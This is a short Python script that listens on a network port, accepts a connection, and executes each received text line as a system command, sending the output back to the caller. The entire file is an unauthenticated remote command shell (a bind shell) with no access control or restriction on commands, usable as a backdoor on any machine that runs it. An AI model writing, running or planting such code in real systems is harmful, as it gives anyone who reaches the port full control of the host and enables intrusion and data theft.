import socket
import props
import subprocess


sock = socket.socket()
sock.bind(('', props.PORT))
sock.listen(1)
conn, addr = sock.accept()
while True:
    data = conn.recv(1024)
    cmd = data.decode('UTF-8').split(' ')
    out = subprocess.check_output(cmd)
    print(f'{out}')
    conn.send(out)

sock.close()
